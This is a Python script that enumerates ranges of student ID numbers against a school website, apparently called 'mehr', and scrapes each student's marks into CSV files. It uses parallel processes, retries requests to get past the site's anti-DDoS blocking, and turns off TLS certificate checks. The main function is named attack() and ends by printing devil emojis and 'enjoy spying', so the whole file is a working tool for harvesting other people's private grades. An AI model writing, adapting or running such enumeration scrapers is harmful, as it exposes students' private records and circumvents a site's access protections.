import os
import multiprocessing
import requests
from lxml import etree
import csv

import settings

def get_html(student_id):
	"""Return content of the website's response to requesting student mark."""
	resp = requests.request(
		method=settings.method, 
		url=settings.url, 
		headers=settings.headers, 
		params=settings.query_string, 
		data=settings.form_data.format(student_id), 
		timeout=settings.timeout, 
		verify=False
	)
	
	if resp is None or resp.status_code != 200:
		raise Exception('no/bad response from mehr')

	html_text = resp._content
	return html_text

def parse(html_text):
	"""Return a list of marks, extracted from the given html."""
	parser = etree.XMLParser(recover=True)
	html_etree = etree.fromstring(html_text, parser)
	mark = html_etree.xpath('//*[@id="M1Q1"]/text()')
	return mark

def get_mark(student_id):
	"""Return a list of marks for student with given id."""
	html_text = get_html(student_id)
	mark = parse(html_text)
	return mark

def save_marks(marks_list, marks_file_path):
	"""Write marks list in a csv file."""
	if len(marks_list) == 0:
		return
	print('saving marks in {0}'.format(marks_file_path))
	with open(marks_file_path, 'w') as marks_file:
		csv_writer = csv.writer(marks_file)
		csv_writer.writerows(marks_list)

def save_failures(failures_list, failures_file_path):
	"""Write failures list in a csv file. 

	Failures list is a list of student ids which this program failed to get a processable response from the website about them. 
	"""
	if len(failures_list) == 0:
		return
	print('saving failures in {0}'.format(failures_file_path))
	with open(failures_file_path, 'w') as failures_file:
		csv_writer = csv.writer(failures_file)
		csv_writer.writerows(failures_list)

def get_marks_list(student_id_range):
	"""Write marks list of students with ids in the argument in a csv file.

	arguments:
	student_id_range -- a range of student ids (e.g. (93104000, 93106000) )
	"""
	first_id = student_id_range[0]
	last_id = student_id_range[1]
	marks_file_path = settings.marks_file_path_template.format(first_id, last_id)
	failures_file_path = settings.failures_file_path_template.format(first_id, last_id)

	marks_list = []
	failures_list = []
	counter = 0
	for i in range(first_id, last_id):
		counter += 1
		student_id = i
		print('checking {0} . . .'.format(student_id))

		# This part requests the website for the student's marks.
		# Blocking or not responding to some requests are common strategies 
		# by websites for preventing DDOS attacks. But re-sending requests 
		# worked for this website. Hence "retry_count".
		successful = False
		for retry_counter in range(settings.retry_count):
			try:
				mark = get_mark(student_id)
				successful = True
				if len(mark) == 0:
					break
				marks_list.append([student_id] + mark)
				break
			except Exception as e:
				print(e)
				print('\tretrying {0} . . .'.format(student_id))
				continue
		if not successful:
			failures_list.append([student_id])

		# Save extracted informations so far
		if counter >= 100:
			counter = 0
			save_marks(marks_list, marks_file_path)
			marks_list = []
			save_failures(failures_list, failures_file_path)
			failures_list = []
	
	save_marks(marks_list, marks_file_path)
	save_failures(failures_list, failures_file_path)

	return (marks_file_path, failures_file_path)

def get_student_id_ranges():
	"""Divide the settings.student_id_range to settings.number_of_threads ranges."""
	start = settings.student_id_range[0]
	end = settings.student_id_range[1]
	count = settings.number_of_threads

	student_id_ranges = []
	step = int((end - start) / count)
	for i in range(count):
		student_id_ranges.append([start + i*step, start + (i+1)*step])
	student_id_ranges[-1] += list(range(student_id_ranges[-1][-1], end))

	return student_id_ranges

def wrap_up_marks(marks_file_paths):
	"""Merge all csv files in a single one and remove them afterwards."""
	# read csv files and sort mark list according to student ids
	all_marks_list = []
	for marks_file_path in marks_file_paths:
		if not os.path.exists(marks_file_path):
			continue
		print('wrapping up {0}'.format(marks_file_path))
		with open(marks_file_path, 'r') as marks_file:
			csv_reader = csv.reader(marks_file)
			mini_marks_list = list(csv_reader)
			all_marks_list += mini_marks_list
	all_marks_list.sort(key=lambda mark: mark[0])

	# save the merged list
	all_marks_file_path = \
		settings.marks_file_path_template.format(
			settings.student_id_range[0], 
			settings.student_id_range[1]
	)
	save_marks(all_marks_list, all_marks_file_path)

	# remove all mini csv files
	for marks_file_path in marks_file_paths:
		if os.path.exists(marks_file_path):
			os.remove(marks_file_path)

def wrap_up_failures(failures_file_paths):
	"""Merge all csv files in a single one and remove them afterwards."""
	# read csv files and sort failures list according to student ids
	all_failures_list = []
	for failures_file_path in failures_file_paths:
		if not os.path.exists(failures_file_path):
			continue
		print('wrapping up {0}'.format(failures_file_path))
		with open(failures_file_path, 'r') as failures_file:
			csv_reader = csv.reader(failures_file)
			mini_failures_list = list(csv_reader)
			all_failures_list += mini_failures_list
	all_failures_list.sort(key=lambda failure: failure[0])

	# save the merged list
	all_failures_file_path = \
		settings.failures_file_path_template.format(
			settings.student_id_range[0], 
			settings.student_id_range[1]
	)
	save_failures(all_failures_list, all_failures_file_path)

	# remove all mini csv files
	for failures_file_path in failures_file_paths:
		if os.path.exists(failures_file_path):
			os.remove(failures_file_path)

def attack():
	"""Save marks of the students with ids in the range given in settings.py in csv files"""
	student_id_ranges = get_student_id_ranges()
	pool = multiprocessing.Pool(settings.number_of_threads)
	
	print('let\'s light up the party ...')

	file_paths = pool.map(get_marks_list, student_id_ranges)
	pool.close()
	pool.join()

	marks_file_path = [file_path[0] for file_path in file_paths]
	wrap_up_marks(marks_file_path)
	failures_file_paths = [file_path[1] for file_path in file_paths]
	wrap_up_failures(failures_file_paths)

	print('😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈')
	print('\tenjoy spying')
	print('😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈 😈')

if __name__ == '__main__':
	attack()
